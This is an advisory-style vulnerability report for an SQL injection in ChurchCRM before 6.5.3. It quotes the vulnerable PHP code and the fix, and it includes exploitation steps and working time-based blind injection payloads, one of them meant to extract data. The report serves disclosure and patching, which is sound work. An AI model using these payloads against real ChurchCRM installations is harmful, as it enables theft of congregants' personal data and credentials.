# CVE-2025-67877 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-67877
- **Affected Software**: ChurchCRM
- **Affected Versions**: < 6.5.3
- **Vulnerability Type**: SQL Injection (CWE-89)
- **Severity**: High

## Vulnerability Description

ChurchCRM versions prior to 6.5.3 contain a SQL injection vulnerability in `src/CartToFamily.php`. The `PersonAddress` POST parameter is not properly sanitized before being used in a SQL query.

## Technical Details

### Vulnerable Code (CartToFamily.php)

```php
// Line 29 - Missing 'int' type cast (VULNERABLE)
$iPersonAddress = InputUtils::legacyFilterInput($_POST['PersonAddress']);

// Line 31-34 - Direct string concatenation in SQL query
if ($iPersonAddress != 0) {
    $sSQL = 'SELECT * FROM person_per WHERE per_ID = ' . $iPersonAddress;
    $rsPerson = RunQuery($sSQL);
    extract(mysqli_fetch_array($rsPerson));
}
```

### Comparison with Secure Code

Other parameters in the same file correctly use type casting:

```php
// Line 18 - Secure: uses 'int' type cast
$iFamilyID = InputUtils::legacyFilterInput($_POST['FamilyID'], 'int');
```

## Exploitation

### Prerequisites

1. Valid user credentials with "Add Records" permission
2. At least one person added to the cart (without family assignment)
3. Select "Create new family" option (FamilyID=0)
4. PersonAddress must not be 0

### Proof of Concept Results

**Time-based SQL Injection - CONFIRMED**

```
Payload: PersonAddress=1 AND SLEEP(5)-- -
Expected delay: ~5 seconds
Actual response time: 5.01 seconds
Result: SQL injection confirmed via time delay
```

### Exploitation Steps

1. Login to ChurchCRM as authenticated user
2. Add a person to cart via: `POST /api/person/{id}/addToCart`
3. Navigate to CartToFamily.php
4. Submit form with FamilyID=0 and malicious PersonAddress

### Example Payloads

Time-based blind injection:
```
PersonAddress=1 AND SLEEP(5)-- -
```

Data extraction (conceptual):
```
PersonAddress=1 AND IF(SUBSTRING(@@version,1,1)='1',SLEEP(5),0)-- -
```

## Impact

An authenticated attacker can:
- Extract sensitive data from the database via time-based blind injection
- Access user credentials, personal information
- Potentially escalate privileges depending on database configuration

## Remediation

Update ChurchCRM to version 6.5.3 or later, which adds the missing 'int' type cast:

```php
$iPersonAddress = InputUtils::legacyFilterInput($_POST['PersonAddress'], 'int');
```

## References

- ChurchCRM GitHub: https://github.com/ChurchCRM/CRM
